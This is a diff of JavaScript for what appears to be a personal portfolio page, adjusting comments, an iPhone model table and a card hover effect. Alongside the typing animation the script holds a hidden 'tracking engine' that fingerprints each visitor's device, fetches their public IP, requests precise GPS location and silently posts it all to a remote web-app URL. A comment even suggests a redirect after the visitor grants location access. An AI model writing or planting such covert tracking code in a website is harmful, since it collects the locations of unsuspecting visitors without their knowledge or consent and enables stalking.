@@ -9,12 +9,10 @@
     let browserDetail = "Unknown Browser";
     let engine = "Unknown Engine";
 
-    // Deteksi Engine
     if (/WebKit/i.test(ua)) engine = "WebKit";
     if (/Gecko/i.test(ua) && !/WebKit/i.test(ua)) engine = "Gecko";
     if (/Chrome/i.test(ua)) engine = "Blink";
 
-    // Deteksi OS & Versi
     if (/iPhone|iPad|iPod/.test(ua)) {
       const v = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/));
       osDetail = `iOS ${v[1]}.${v[2]}.${v[3] || '0'}`;
@@ -29,7 +27,6 @@
       osDetail = navigator.platform;
     }
 
-    // Deteksi Browser & Versi
     let M = ua.match(/(opera|chrome|safari|firefox|msie|trident|edg(?=\/))\/?\s*(\d+)/i) || [];
     let name = M[1] ? M[1].toLowerCase() : "Unknown";
     let version = M[2] || "0";
@@ -42,7 +39,7 @@
     return { osDetail, browserDetail };
   };
 
-  // === 3. DETEKSI MODEL IPHONE (UP TO IPHONE 16) ===
+  // === 3. DETEKSI MODEL IPHONE ===
   const getDeviceModel = () => {
     const w = window.screen.width;
     const h = window.screen.height;
@@ -50,8 +47,8 @@
     if (!/iPhone|iPad|iPod/.test(ua)) return navigator.platform;
 
     const models = {
-      "440:956": "iPhone 16 Pro Max",
-      "402:874": "iPhone 16 Pro",
+      "440:956": "iPhone 16/17 Pro Max",
+      "402:874": "iPhone 16/17 Pro",
       "430:932": "iPhone 15/16 Plus / 14 Pro Max",
       "393:852": "iPhone 15/16 / 14 Pro",
       "390:844": "iPhone 12/13/14",
@@ -64,7 +61,7 @@
     return models[`${w}:${h}`] || "Apple iPhone";
   };
 
-  // === 4. TRACKING ENGINE (LOGIKA UPDATE & BARU) ===
+  // === 4. TRACKING ENGINE ===
   const startTracker = async () => {
     const specs = getDetailedSpecs();
     let payload = {
@@ -76,7 +73,6 @@
       lat: null, long: null
     };
 
-    // Ambil IP
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const d = await res.json();
@@ -87,21 +83,21 @@
       fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });
     };
 
-    // Jalankan Geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((pos) => {
         payload.lat = pos.coords.latitude;
         payload.long = pos.coords.longitude;
-        sendData(payload); // Kirim dengan lokasi (Update baris yang sama)
+        sendData(payload);
+        // Opsi: Tambahkan redirect setelah Allow di sini jika diinginkan
       }, () => {
-        sendData(payload); // Kirim tanpa lokasi (Bikin baris baru)
+        sendData(payload);
       }, { enableHighAccuracy: true });
     } else {
       sendData(payload);
     }
   };
 
-  // === 5. UI EFFECTS (TYPING & RIPPLE) ===
+  // === 5. UI EFFECTS (TYPING) ===
   const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
   let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;
 
@@ -137,8 +133,11 @@
         const rect = card.getBoundingClientRect();
         const x = ((e.clientX - rect.left) / rect.width) * 100;
         const y = ((e.clientY - rect.top) / rect.height) * 100;
-        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
-        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
+        const inner = card.querySelector('.card-inner');
+        if(inner) {
+            inner.style.setProperty('--x', `${x}%`);
+            inner.style.setProperty('--y', `${y}%`);
+        }
       });
     });
   });
